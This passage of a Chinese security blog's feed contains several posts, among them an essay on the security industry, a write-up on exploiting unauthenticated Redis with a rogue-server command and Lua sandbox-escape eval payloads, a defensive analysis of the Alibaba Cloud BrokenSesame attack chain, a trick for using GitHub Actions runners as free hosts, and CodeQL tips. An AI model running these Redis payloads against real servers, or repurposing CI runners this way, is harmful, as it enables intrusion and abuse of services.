src="https://blog.dvkunion.cn/img/1000-1633009639.png" alt="谁动了我的奶酪"></p><blockquote><p>&quot;变是唯一的不变&quot;       ----《谁动了我的奶酪?》斯宾塞·约翰逊</p></blockquote><p>和下一届的小伙伴们交流的时候, 听到的最多的就是: &quot;安全越来越卷了&quot;。</p><p>仔细想想确实, 相比18年, 会用扫描工具就可以去现场打攻击, 会写代码的安全人员凤毛麟角, 能够对工具进行调参, 了解一些绕过, 挖过一些cms, 基本上都可以到达高级工程师了。</p><p>而时至今日，各类反序列化已经是八股文必备，开发语言起码要会一个python，手上没有cnvd/cisp证书? 回去等消息吧。</p><p>再加上实际可能面试的公司内部连一个java/php应用都没有, 清一色的.net/asp的古董，你每天的工作就是坐在电脑前对着所谓的安全产品，点击鼠标，向领导汇报今日的安全巡检。</p><p>如此的反差，乍一看确实，安全的门槛越来越高，近代的安全培训产出物已不能够满足达标了; 学完辅导班，还得回家做作业，真的是太&quot;卷&quot;了。</p><p>但实际上这种比较的意义一点没有，除了制造焦虑。</p><p>你如果拿18年的状态与00年再对比，拿着明小子阿D就是大黑阔的年代里, 我从未见过当年的那一帮人有在抱怨道，越来越卷了。</p><p>行业在不断发展，自然而然新技术的革新与换代将替换掉一波又一波的浪潮，唯一不同的，是替换的周期随着技术的发展，将越来越快，越来越迅速。</p><p>不仅仅是安全，开发也一样：现在的研发没做过微服务分布式，没有个千万级别的项目经验，还敢面试研发岗位吗? 对比那个可以照着手册敲代码的年代，整个的门槛确实提高了。</p><p>其实这和抱怨 xx 年没买比特币， xx 年没入楼市，xx 年没入股市一样，<strong>面对变化，怀念过去。</strong></p><h2 id="font-color-259d92-0x05-结尾-font"><font color = "#259d92"> 0x05 - 结尾 </font></h2><p>乱七八糟聊了一堆，今年确实是一个困难的年份，而且就目前的情况来说，明年将会更加困难。</p><p>时代在变化，并且越来越快，安全行业真的还能够在这个浪潮中扛得住吗?</p><p>我的答案是肯定的，未来不会没有安全；但同样，肯定不会是以现在的这个样貌活下去。</p><p>最近在刷行尸走肉，很喜欢的一张海报：</p><p><img src="https://blog.dvkunion.cn/img/4e741d3277fdf24ba27d163387148534a7a93bca7d153-VfbA5t_fw658-1727603225.png" alt=""></p><p>&quot;黑夜即将来临，你是愿意就此长眠，还是愿意和我一起，冰冷的守着下一个黎明?&quot;</p><h4 id="参考链接">参考链接</h4><blockquote><p>0.安全公司的财报 : <a href="https://mp.weixin.qq.com/s/RI3XX8veXirLfxe6e1qv0g">https://mp.weixin.qq.com/s/RI3XX8veXirLfxe6e1qv0g</a><br>2.请先理解了云原生再谈容器安全 : <a href="https://www.freebuf.com/articles/container/377477.html">https://www.freebuf.com/articles/container/377477.html</a><br>4.[百度百科] : <a href="https://baike.baidu.com/item/%E5%9B%9A%E5%BE%92%E5%9B%B0%E5%A2%83/5739141?fr=ge_ala">https://baike.baidu.com/item/囚徒困境/5739141?fr=ge_ala</a></p></blockquote>]]></content>
    
    
    <summary type="html">&lt;h1&gt;安全的囚徒困境&lt;/h1&gt;
&lt;hr&gt;
&lt;center&gt;&lt;small&gt;2023-11-07&lt;/small&gt;&lt;/center&gt;
&lt;!-- split --&gt;
&quot;黑夜即将来临，你是愿意就此长眠，还是愿意和我一起，冰冷的守着下一个黎明?&quot;</summary>
    
    
    
    <category term="essay" scheme="http://blog.dvkunion.cn/categories/essay/"/>
    
    
    <category term="随笔" scheme="http://blog.dvkunion.cn/tags/%E9%9A%8F%E7%AC%94/"/>
    
  </entry>
  
  <entry>
    <title>关于Redis未授权利用的一些思考</title>
    <link href="http://blog.dvkunion.cn/2023/06/13/redis%20%E6%9C%AA%E6%8E%88%E6%9D%83%E7%9A%84%E6%80%9D%E8%80%83/"/>
    <id>http://blog.dvkunion.cn/2023/06/13/redis%20%E6%9C%AA%E6%8E%88%E6%9D%83%E7%9A%84%E6%80%9D%E8%80%83/</id>
    <published>2023-06-13T13:29:08.000Z</published>
    <updated>2024-03-18T17:47:44.439Z</updated>
    
    <content type="html"><![CDATA[<h1>Redis未授权利用的一些思考</h1><!-- split --><blockquote><p>一台未授权的redis，究竟能做些什么？</p></blockquote><span id="more"></span><h2 id="0x00-前言">0x00 前言</h2><p>问题如上。<br>其实真正遇到这个问题的时候我的第一反应也是没有当作一回事，毕竟redis未授权已经算得是和Top 10级别的漏洞一样耳熟能详的一个实战漏洞了，答案也是八股文张口就来：</p><ol><li>向web目录写入webshell</li><li>通过写入authotrized_keys获取ssh登录权限</li><li>通过crontab写入定时任务反弹shell</li></ol><p>这几个选项是最常用的，也是最通用化的redis利用方式。基本上在目前的搜索引擎上能够获取到大量的文章，一般的面试以及普通的ctf靶场也通常会针对这几个考点来展开。但是实际上：</p><ol><li>web路径未知，需要猜解或通过其他手段获取，或实际上在微服务分离的架构下redis服务器上不可能存在web服务，更有可能仅是一个redis容器。</li><li>redis主机没有暴露ssh端口，或根本不存在sshd服务，导致即使写入authotrized_keys，也无法实际利用。</li><li>运行redis服务的账户权限极低，无法向/root/.ssh写入文件。</li><li>redis主机没有crontab服务</li></ol><p>针对如上的限制，我们重新修改问题：</p><blockquote><p>一台未授权且仅包含redis服务(容器化)，暴露的端口只有6379的redis容器，除了上述的几个方面，还能做些什么？</p></blockquote><h2 id="0x03-主从复制-远程-so加载">0x03 主从复制 远程.so加载</h2><p>如果你足够细心和关注社区动态，那么在先知等平台</p><p>2019年7月7日，LC/BC的成员Pavel Toporkov在WCTF2019 Final分享会上介绍了Redis新版本的远程命令执行漏洞的利用方式。由于在Reids 4.x及以上版本中新增了模块功能，攻击者可通过外部拓展，在Redis中实现一个新的Redis命令。攻击者可以利用该功能引入模块，<a href="http://xn--ghq48aq2ccin2afa388dzrbz19bmwa4y33uy0fplhhmalnz62t9jxdvhm1hsb25a.so">在未授权访问的情况下使被攻击服务器加载恶意.so</a> 文件，从而实现远程代码执行。</p><p>但随着现代的服务部署方式的不断发展，组件化成了不可逃避的大趋势，docker就是这股风潮下的产物之一，而在这种部署模式下，一个单一的容器中不会有除redis以外的任何服务存在，包括ssh和crontab，再加上权限的严格控制，只靠写文件就很难再getsell了，在这种情况下，我们就需要其他的利用手段了。</p><p>此漏洞存在于4.x、5.x版本中，Redis提供了主从模式，主从模式指使用一个redis作为主机，其他的作为备份机，主机从机数据都是一样的，从机只负责读，主机只负责写。在Redis 4.x之后，通过外部拓展，可以实现在redis中实现一个新的Redis命令，构造恶意.so文件。在两个Redis实例设置主从模式的时候，Redis的主机实例可以通过FULLRESYNC同步文件到从机上。然后在从机上加载恶意so文件，即可执行命令。</p><p>简单的说，攻击者（主机)写一个so文件，然后通过FULLRESYNC(全局)同步文件到受害人〈从机)上。</p><p><a href="https://github.com/n0b0dyCN/RedisModules-ExecuteCommand">exp</a></p><p><a href="https://github.com/LoRexxar/redis-rogue-server.git">代码仓库</a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 redis-rogue-server.py --rhost 118.193.36.37 --rport 57048 --lhost 98.126.111.111 --lport 23333</span><br></pre></td></tr></table></figure><h2 id="0x04-Redis沙盒逃逸">0x04 Redis沙盒逃逸</h2><p>Redis是著名的开源Key-Value数据库，其具备在沙箱中执行Lua脚本的能力。<br>Debian以及Ubuntu发行版的源在打包Redis时，不慎在Lua沙箱中遗留了一个对象package，攻击者可以利用这个对象提供的方法加载动态链接库liblua里的函数，进而逃逸沙箱执行任意命令。<br>我们借助Lua沙箱中遗留的变量package的loadlib函数来加载动态链接库/usr/lib/x86_64-linux-gnu/liblua5.1.so.0里的导出函数luaopen_io。在Lua中执行这个导出函数，即可获得io库，再使用其执行命令</p><p>eval 'local io_l = package.loadlib(&quot;/usr/lib/x86_64-linux-gnu/liblua5.1.so.0&quot;, &quot;luaopen_io&quot;); local io = io_l(); local f = io.popen(&quot;id&quot;, &quot;r&quot;); local res = f:read(&quot;*a&quot;); f:close(); return res' 0</p><p>eval 'local io_l = package.loadlib(&quot;/usr/lib/x86_64-linux-gnu/liblua5.1.so.0&quot;, &quot;luaopen_io&quot;); local io = io_l(); local f = io.popen(&quot;ls /tmp&quot;, &quot;r&quot;); local res = f:read(&quot;*a&quot;); f:close(); return res' 0</p><h2 id="0x05-考虑云场景下的环境">0x05 考虑云场景下的环境</h2><p>对于这种微服务架构、</p><h2 id="结尾">结尾</h2><p><a href="https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf">exploit</a><br><a href="https://github.com/vulhub/vulhub/tree/master/redis">vulhub</a><br><a href="https://xz.aliyun.com/t/2295">先知-redis利用</a><br><a href="https://paper.seebug.org/975/">404-主从复制</a><br><a href="https://sec-in.com/article/1309">利用总结</a><br><a href="https://github.com/00theway/redis_exp">github-exp</a><br><a href="https://github.com/Ridter/hackredis">检测工具</a><br><a href="https://github.com/Testzero-wz/Awsome-Redis-Rogue-Server">其他</a></p><h4 id="参考链接">参考链接</h4><blockquote><p>0.exp : <a href="https://github.com/n0b0dyCN/RedisModules-ExecuteCommand">https://github.com/n0b0dyCN/RedisModules-ExecuteCommand</a><br>1.代码仓库 : <a href="https://github.com/LoRexxar/redis-rogue-server.git">https://github.com/LoRexxar/redis-rogue-server.git</a><br>2.exploit : <a href="https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf">https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf</a><br>3.vulhub : <a href="https://github.com/vulhub/vulhub/tree/master/redis">https://github.com/vulhub/vulhub/tree/master/redis</a><br>4.先知-redis利用 : <a href="https://xz.aliyun.com/t/2295">https://xz.aliyun.com/t/2295</a><br>5.404-主从复制 : <a href="https://paper.seebug.org/975/">https://paper.seebug.org/975/</a><br>6.利用总结 : <a href="https://sec-in.com/article/1309">https://sec-in.com/article/1309</a><br>7.github-exp : <a href="https://github.com/00theway/redis_exp">https://github.com/00theway/redis_exp</a><br>8.检测工具 : <a href="https://github.com/Ridter/hackredis">https://github.com/Ridter/hackredis</a><br>9.其他 : <a href="https://github.com/Testzero-wz/Awsome-Redis-Rogue-Server">https://github.com/Testzero-wz/Awsome-Redis-Rogue-Server</a></p></blockquote>]]></content>
    
    
    <summary type="html">&lt;h1&gt;Redis未授权利用的一些思考&lt;/h1&gt;
&lt;!-- split --&gt;
&lt;blockquote&gt;
&lt;p&gt;一台未授权的redis，究竟能做些什么？&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="Bugs" scheme="http://blog.dvkunion.cn/categories/Bugs/"/>
    
    
    <category term="漏洞跟踪" scheme="http://blog.dvkunion.cn/tags/%E6%BC%8F%E6%B4%9E%E8%B7%9F%E8%B8%AA/"/>
    
    <category term="开发工具" scheme="http://blog.dvkunion.cn/tags/%E5%BC%80%E5%8F%91%E5%B7%A5%E5%85%B7/"/>
    
  </entry>
  
  <entry>
    <title>蓝军视角:阿里云 RCE 战火余烬下的启示</title>
    <link href="http://blog.dvkunion.cn/2023/05/25/%E9%98%BF%E9%87%8C%E4%BA%91%20RCE%20%E6%88%98%E7%81%AB%E4%BD%99%E7%83%AC%E4%B8%8B%E7%9A%84%E5%90%AF%E7%A4%BA/"/>
    <id>http://blog.dvkunion.cn/2023/05/25/%E9%98%BF%E9%87%8C%E4%BA%91%20RCE%20%E6%88%98%E7%81%AB%E4%BD%99%E7%83%AC%E4%B8%8B%E7%9A%84%E5%90%AF%E7%A4%BA/</id>
    <published>2023-05-25T17:11:10.000Z</published>
    <updated>2024-03-18T17:47:44.439Z</updated>
    
    <content type="html"><![CDATA[<h1>蓝军视角: 阿里云 RCE 战火余烬下的启示</h1><!-- split --><p>2023年4月19日，Wiz Research 在文章 <a href="https://www.wiz.io/blog/brokensesame-accidental-write-permissions-to-private-registry-allowed-potential-r">Accidental ‘write’ permissions to private registry allowed potential RCE to Alibaba Cloud Database Services</a> 中披露了被命名为<code>BrokenSesame</code>的一系列阿里云数据库服务漏洞，向我们展示了如何从一个容器逃逸漏洞，与私有仓库写权限的组合，最终实现RCE的攻击链路。该漏洞最终可导致未授权访问阿里云客户的PostgreSQL数据库，并且可以通过在阿里巴巴的数据库服务执行供应链攻击。</p><p>时隔一个月，在经过研究与复现的过程中，不由得感叹攻击者的构思巧妙；而反过来作为防守人员，我们能否在这次战役中，吸取一些教训？让我们站在蓝军的视角再看一遍完整的攻击路程。</p><span id="more"></span><h2 id="0x01-容器提权">0x01 容器提权</h2><p>在原文中，作者分享了两个案例：ApsaraDB RDS for PostgreSQL 和  AnalyticDB for PostgreSQL。 两个案例的第一步均为容器提权：从普通账户提权至更高的权限。 在这一步中，两个案例分别用到了不同的攻击链路：</p><ul><li>cron定时任务'/usr/bin/tsar' -&gt; 高权限执行的二进制文件 -&gt; 可修改的动态链接库 -&gt; 覆盖链接库 -&gt; 定时任务出发执行获取root权限。</li><li>容器共享目录 -&gt; 业务特性导致任意文件读取（符号链接）-&gt;  获取到另一个容器的读取下权限。</li></ul><p>在这两个链路中，链路1实际上是在渗透过程中最常使用的一种攻击方式，通过注入恶意动态链接库实现账户提权。这条链路涉及到了两个关键的问题点：cron定时任务的启动权限和动态链接库权限。cron的高权限导致所有定时任务都通过高权限账户root来执行，而可修改的动态链接库权限导致覆盖动态链接库；</p><p><img src="https://blog.dvkunion.cn/img/1681856311-screenshot-2023-04-18-at-15-18-07.png" alt="链路1"></p><p>针对这两个风险点，传统的HIDS文件监控即可覆盖到该层面。除此之外，对于添加进入定时任务的二进制程序，应该严格限制其权限，包括动态链接库文件。</p><p>在第二条链路中，我们发现实际上业务在设计架构模式上时，使用了共享容器的目录来实现通信；但业务代码并没有考虑符号链接的场景，导致了第二个文件下的任意文件读取。</p><p>整体来看，链路1和链路2分别属于的HIDS主机监控/黑白盒业务安全扫描的范畴，说明即使在云场景下，传统的业务安全依旧处于重要地位。</p><h2 id="0x02-容器逃逸">0x02 容器逃逸</h2><p>获取到容器root权限后，下一步便是朝着宿主机进行攻击，同样是两条链路：</p><ul><li>共享pid namespcae -&gt; 监听发现共享的挂载目录'/home/adbpgadmin' -&gt; 植入ssh/config获取容器B权限 -&gt; 通过容器B的docker.sock 逃逸至宿主机。</li><li>由提权过程中的任意文件读取获取到业务代码 -&gt; 代码审计发现命令注入 -&gt; 通过命令注入获取到特权容器的shell -&gt; 通过<code>core_pattern</code>实现容器逃逸。</li></ul><p>在这两条链路中，攻击者使用了两种不同的逃逸方式：共享namespace导致攻击者获取到更多信息、挂载docker.sock导致逃逸、特权容器复写core_pattern导致逃逸；这几种方式是云环境中比较经典的逃逸场景，使得容器绕过各种隔离限制，对容器外的宿主机或其他容器的资源进行操作。</p><p>如何对容器逃逸进行防御？传统的业务安全和主机安全并没有针对主机cgroups和namespace的防御设计；结合云原生的架构模式，可以在两个环节建设容器逃逸检测。</p><ul><li>DevSecOps安全左移，对代码仓库构建产物的IaC(基础设施即代码)进行审查，在开发阶段对可能存在逃逸风险的配置项问题进行阻断，防止出现各类逃逸问题。</li><li>运行时监测, 对于已经上线并实际运行的业务容器，实时监控逃逸特征。通过订阅内核事件，抓取可能为逃逸的行为特征，结合当前运行中的容器配置信息进行分析，综合给出是否存在逃逸风险以及是否发生逃逸事件的告警。</li></ul><p>结合这两点，可以做到对逃逸风险的有效控制，防止攻击者进一步的攻击行为。</p><h2 id="0x03-横向扩散">0x03 横向扩散</h2><p>在实现逃逸后，获取到的数据就越来越宽泛。</p><ul><li>通过k8s节点存储凭证可获取各种敏感资源如secrets、configmaps。</li><li>通过imagePullSecrets获取到了私有镜像仓库权限。</li><li>环境变量中存储了access_keys等敏感信息。</li><li>其他用户的pod信息等。</li></ul><p>可以看到，在实现了容器逃逸后，攻击者轻松从各种凭证信息实现横向扩撒，包括各类敏感资源数据、镜像仓库权限等等；这好比在传统的渗透中，从DMZ区进入到了内网环境后，发现大多主机MS-17010通杀的场景；说明对于云环境下的节点管理，仍需要加强警惕，尤其是在容器逃逸防护较弱的场景下。</p><p>针对这部分横向移动与扩散的攻击行为，可以和容器逃逸一样分为两个方面进行防护：</p><ul><li>事前防护：对镜像资产/容器资产进行扫描，保证镜像/容器内没有敏感信息以及过高的凭证信息。</li><li>事中防护：通过对集群日志审计来发现横向移动行为，快速响应并隔离问题容器。</li></ul><h2 id="0x04-综合反思">0x04 综合反思</h2><p>回顾整条攻击链，我们可以总结以下几点：</p><p><strong>传统的业务安全在云原生环境下依旧处于重要地位</strong><br>回看整个攻击过程，所有的切入点仍然是一个容器服务。虽然容器提供了相对隔离的运行环境，但传统的业务安全如：web安全所导致的问题依旧作为了云安全事件中的切入点，其地位不亚于弱口令。</p><p><strong>云环境的场景下，传统安全的危害效应将指数级放大</strong><br>云环境中的配置复杂，一旦存在了配置不当的情况，攻击者便可以轻易的将攻击从一个容器扩散到一台主机、一个集群、甚至于多个集群、整个k8s环境。此时，作为入侵的入口导致的影响指数级上升。</p><p><strong>云环境的场景下，容器逃逸是整个攻击链路的核心</strong><br>在整个攻击的步骤中，我们可以总结出：攻击者获取到一个容器的最高权限后，必须千方百计的实现逃逸来绕过各种资源限制，才能够产生更为严重的影响；因此，云环境场景下，逃逸问题是连接传统安全与云安全的关键核心。</p><p><strong>云环境对基础设施的监控、审计需求更加复杂和迫切</strong><br>云计算的特性使得基础设施的边界变得模糊，资源的动态变化增加了管理和保护的难度，同时多租户环境下的安全性和合规性风险也需要得到充分的关注和解决，带有缺陷的隔离限制将轻易的导致用户数据泄露。</p><p>同时，我们也能看到，云环境的场景下，对于蓝军防守方，提供了一个新的思路：<div color=red><strong>在面对传统安全覆盖率永远无法达到100%以及层出不穷的0day漏洞，加强对云安全防护以及逃逸检测能够有效的中断攻击链路，降低攻击危害，实现低成本/高回报率的防护。</strong></div></p><p>针对对以上的问题，牧云-云原生安全平台提供了完整的监控与检测方案，深入监控了每一个容器的生命周期，在传统的webshell、反弹shell等安全入侵能力检测上，结合云环境特点，实现了容器逃逸风险监测、集群日志审计等功能，帮助您清晰明了的掌控集群的实时安全；当发生安全事件时，黑客的恶意行为和特征将会被检测与捕捉，实时反馈到平台中。</p><p><img src="https://blog.dvkunion.cn/img/16842061452391.png" alt="img.png"></p><p>除此之外，为保证供应链安全，牧云-云原生安全平台提供了定时任务机制和多种多样的资源集成，定时检测您的镜像仓库等远端资源，第一时间发现风险镜像，包括敏感信息泄漏、恶意文件、软件漏洞等问题。并通过配置可以阻断来自于该镜像的容器创建请求以及镜像构建请求，防止攻击扩散。</p><p><img src="https://blog.dvkunion.cn/img/16842062957916.png" alt="资源集成"></p><p>与此同时，牧云-云原生安全还考虑了云场景下资源迭代的快速以及漏洞响应的及时性，设计了插件系统，结合开源社区安全检测能力的沉淀，能够快速赋能最新漏洞检测需求，并热更新于平台中，提供与时俱进的插拔式安全检测能力；如前一阵子出现的Minio漏洞（CVE-2023-28432），可以通过快速插入专项检测插件来实现0 day速查。</p><p><img src="https://blog.dvkunion.cn/img/16842062518677.png" alt=""></p><h4 id="参考链接">参考链接</h4><blockquote><p>0.Accidental ‘write’ permissions to private registry allowed potential RCE to Alibaba Cloud Database Services : <a href="https://www.wiz.io/blog/brokensesame-accidental-write-permissions-to-private-registry-allowed-potential-r">https://www.wiz.io/blog/brokensesame-accidental-write-permissions-to-private-registry-allowed-potential-r</a></p></blockquote>]]></content>
    
    
    <summary type="html">&lt;h1&gt;蓝军视角: 阿里云 RCE 战火余烬下的启示&lt;/h1&gt;
&lt;!-- split --&gt;
&lt;p&gt;2023年4月19日，Wiz Research 在文章 &lt;a href=&quot;https://www.wiz.io/blog/brokensesame-accidental-write-permissions-to-private-registry-allowed-potential-r&quot;&gt;Accidental ‘write’ permissions to private registry allowed potential RCE to Alibaba Cloud Database Services&lt;/a&gt; 中披露了被命名为&lt;code&gt;BrokenSesame&lt;/code&gt;的一系列阿里云数据库服务漏洞，向我们展示了如何从一个容器逃逸漏洞，与私有仓库写权限的组合，最终实现RCE的攻击链路。该漏洞最终可导致未授权访问阿里云客户的PostgreSQL数据库，并且可以通过在阿里巴巴的数据库服务执行供应链攻击。&lt;/p&gt;
&lt;p&gt;时隔一个月，在经过研究与复现的过程中，不由得感叹攻击者的构思巧妙；而反过来作为防守人员，我们能否在这次战役中，吸取一些教训？让我们站在蓝军的视角再看一遍完整的攻击路程。&lt;/p&gt;</summary>
    
    
    
    <category term="Bugs" scheme="http://blog.dvkunion.cn/categories/Bugs/"/>
    
    
    <category term="云安全" scheme="http://blog.dvkunion.cn/tags/%E4%BA%91%E5%AE%89%E5%85%A8/"/>
    
    <category term="漏洞跟踪" scheme="http://blog.dvkunion.cn/tags/%E6%BC%8F%E6%B4%9E%E8%B7%9F%E8%B8%AA/"/>
    
  </entry>
  
  <entry>
    <title>白嫖国外主机新思路</title>
    <link href="http://blog.dvkunion.cn/2023/02/24/%E7%99%BD%E5%AB%96%E5%9B%BD%E5%A4%96%E4%B8%BB%E6%9C%BA%E6%96%B0%E6%80%9D%E8%B7%AF/"/>
    <id>http://blog.dvkunion.cn/2023/02/24/%E7%99%BD%E5%AB%96%E5%9B%BD%E5%A4%96%E4%B8%BB%E6%9C%BA%E6%96%B0%E6%80%9D%E8%B7%AF/</id>
    <published>2023-02-24T13:01:12.000Z</published>
    <updated>2024-03-18T17:47:44.439Z</updated>
    
    <content type="html"><![CDATA[<h1>白嫖国外主机新思路</h1><!-- split --><blockquote><p>免责声明: 本文属于纯思路探讨，使用demo代码所造成的影响与作者无关。</p></blockquote><span id="more"></span><h2 id="前言">前言</h2><p>近日，百川云平台发布了新的产品：牧云主机管理助手。可以帮助用户简单、轻量级的进行主机管理。</p><p><img src="https://blog.dvkunion.cn/img/d946d58b-8d6b-4ddb-a7f5-50a7d749214f.png" alt=""></p><p>很快啊，在体验了一波基本功能后，发现主机助手真的很便捷：</p><ul><li>一键安装，秒级同步</li><li>家里的虚拟机再也不用通过端口转发这种粗暴的方式来提供远程使用</li><li>各云厂商的主机再也不用记IP登陆</li><li>换一台全新的电脑也能够立马投入工作，优雅的远程连接到了自己的服务器（elegant~)</li><li><strong>三台主机内还是免费使用</strong></li></ul><p>一番把玩后，作为一个白嫖怪，还是发现了一个盲点：</p><blockquote><p>牧云主机管理助手的定位是：主机管理工具。<br>那么对于白嫖怪来说，我连主机都没有，该怎么办呢？</p></blockquote><h2 id="打开格局">打开格局</h2><p>早期在关注主机白嫖这个方向时，除了各种云厂商的学生党羊毛，还曾注意到一个思路，那就是现在众多的CI平台。</p><p>随着云原生环境的不断发展，越来越多的厂商开始接受DevOps的思路，持续集成(CI)也成为了必不可缺的一个环节。通过持续集成，开发者可以快速、自动、可重复的将代码进行测试、编译、打包等步骤，从源代码生成发布版本。</p><p><img src="https://blog.dvkunion.cn/img/908ac14a-013b-491d-ad24-9c67d877508a.png" alt=""></p><p>而持续集成的整个环节，都会提供一个环境供流程进行自动构建。这个执行构建的主机自然就成了我们白嫖怪的目标。</p><p>在最初的思路中，我们能够获取主机操作权限的方式，第一反应通常都是<code>ssh</code>,因此，现有的白嫖版本都是通过各种ssh模拟服务来连接到action VM环境中。（<a href="https://p3terx.com/archives/ssh-to-the-github-actions-virtual-server-environment.html">https://p3terx.com/archives/ssh-to-the-github-actions-virtual-server-environment.html</a> )</p><p>但是在实际使用中，由于ssh交互的问题，很容易导致断开连接后，整个环境丢失。使用的体验上并没有那么舒适。</p><p>结合最近出现的牧云主机管理助手，突发奇想：能否通过牧云主机助手的方式，来获取到action VM的权限呢？</p><h2 id="实际测试">实际测试</h2><p>如此，我们要做的事情就很明确了：</p><ul><li>让CI执行牧云主机助手部署的脚本</li><li>因为部署脚本是daemon模式，所以我们需要sleep来维持CI存活的状态。</li></ul><p>仅需两步，我们就可以获取到了一个免费的 E5 2vCPU/​7G RAM/​90G SSD主机。</p><p><img src="https://blog.dvkunion.cn/img/f2e36e56-ad04-4d72-b3cc-592ff8109dc3.png" alt=""></p><p>为了方便使用，我将上述思路打包成了<a href="https://github.com/marketplace/actions/dvkunion-collie">Github Action</a>，详细代码可以查看 <a href="https://github.com/DVKunion/collie_tricker">Github仓库</a>, 方便开发者快速进行接入。</p><h2 id="使用场景">使用场景</h2><p>在执行Github Action时，无法登陆到实际执行的VM环境中来进行debug，检查构建失败的真正原因。</p><p>此时可以使用上述GitHub action, 通过牧云主机管理助手登陆到debug action的环境中，手动check构建失败的问题，从而避免了修改workflows来进行debug的麻烦方式。</p><p>该场景仅作为抛砖引玉，除此之外，我相信实际能够应对的场景仍有很多，而且牧云主机管理助手仍在以腹泻式进行迭代更新，欢迎大家探索和分享出更多的玩法～</p><h4 id="参考链接">参考链接</h4><blockquote><p>3.Github Action : <a href="https://github.com/marketplace/actions/dvkunion-collie">https://github.com/marketplace/actions/dvkunion-collie</a><br>4.Github仓库 : <a href="https://github.com/DVKunion/collie_tricker">https://github.com/DVKunion/collie_tricker</a></p></blockquote>]]></content>
    
    
    <summary type="html">&lt;h1&gt;白嫖国外主机新思路&lt;/h1&gt;
&lt;!-- split --&gt;
&lt;blockquote&gt;
&lt;p&gt;免责声明: 本文属于纯思路探讨，使用demo代码所造成的影响与作者无关。&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="tools" scheme="http://blog.dvkunion.cn/categories/tools/"/>
    
    
    <category term="主机" scheme="http://blog.dvkunion.cn/tags/%E4%B8%BB%E6%9C%BA/"/>
    
    <category term="国外" scheme="http://blog.dvkunion.cn/tags/%E5%9B%BD%E5%A4%96/"/>
    
    <category term="工具" scheme="http://blog.dvkunion.cn/tags/%E5%B7%A5%E5%85%B7/"/>
    
  </entry>
  
  <entry>
    <title>CodeQL 踩坑指南</title>
    <link href="http://blog.dvkunion.cn/2022/03/24/CodeQL-%E8%B8%A9%E5%9D%91%E6%8C%87%E5%8D%97/"/>
    <id>http://blog.dvkunion.cn/2022/03/24/CodeQL-%E8%B8%A9%E5%9D%91%E6%8C%87%E5%8D%97/</id>
    <published>2022-03-24T10:02:00.000Z</published>
    <updated>2024-03-18T17:47:44.439Z</updated>
    
    <content type="html"><![CDATA[<h1>CodeQL 踩坑指南 - Java</h1><!-- split --><p>讲解这东西的大师傅们太多了，不班门弄斧了，这里仅针对一些踩过的坑点提供一些自己的解决方案，希望能对一些师傅提供点帮助。</p><span id="more"></span><h2 id="坑I-Lombok">坑I - Lombok</h2><h3 id="场景">场景</h3><p>在构建一些小型cms和自己的一些项目时，突然发现构建好的数据库内源码比实际的源码少了一大半，导致很多规则分析的flow直接断掉了，什么规则扫描结果都没有。</p><h3 id="原因">原因</h3><p>构建好的数据库文件夹下，源码是存放在src.zip下的。通过vscode的插件，将数据库添加后也可以看到构建加载后的源码。通过对比源码，发现丢失的java文件都存在lombok注解（@Data/@Sl4j)。<br><img src="https://blog.dvkunion.cn/img/16479334970645.jpg" alt=""></p><p>这里的原因就是由于项目使用了lombok。根据官方<a href="https://github.com/github/codeql/issues/8363">Github Issue</a>可得知，lombok 代码在编译期间使用注释处理器转换为正确的 Java 代码。这会干扰 CodeQL 分析器，该分析器会在源代码转换为有效的 Java 代码之前“查看”源代码，从而导致它跳过此类文件。</p><h3 id="解决方案">解决方案</h3><p>按照官方的思路，解决方式就是将所有文件还原为不使用lombok的方式。还原的方案主要有两种：</p><p><strong>1.通过Lombok.jar 直接还原文件</strong></p><p>在官方的<a href="https://github.com/github/codeql/issues/4984#:~:text=Unfortunately%20Lombok%20does%20not%20work%20with%20the%20CodeQL,the%20source%20files%20before%20running%20CodeQL%20as%20follows%3A">Github Issue</a>提供了一种方式。</p><p>下载项目对应版本的lombok.jar(或者从External Libraries寻找下载好的依赖jar包)，运行：</p><p><code>java -jar lombok.jar delombok . -d &quot;delombok-code&quot;</code><br>这会将当前目录下的所有使用了lombok的代码还原为不使用的状态，并存放在delombok-code这个目录下。</p><p>但是在实际测试中，这种方式不会对项目内关联的代码进行还原，比如自己定义的一些TO类，在这种方式的还原下只会被还原成Object，而不是实际的TO对象。可能会对代码分析造成一定的影响。</p><p><strong>2. 使用maven-delombok</strong><br>这种方式的好处在于可以在maven build的过程中来对lombok进行还原，可以很好的解决依赖关系，不会出现上述还原为未定义的Object的场景。</p><p>在pom文件内增加：</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"> <span class="tag">&lt;<span class="name">build</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">plugins</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.projectlombok<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>lombok-maven-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.18.4.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">executions</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">execution</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">phase</span>&gt;</span>generate-sources<span class="tag">&lt;/<span class="name">phase</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">goals</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">goal</span>&gt;</span>delombok<span class="tag">&lt;/<span class="name">goal</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">goals</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">encoding</span>&gt;</span>UTF-8<span class="tag">&lt;/<span class="name">encoding</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span 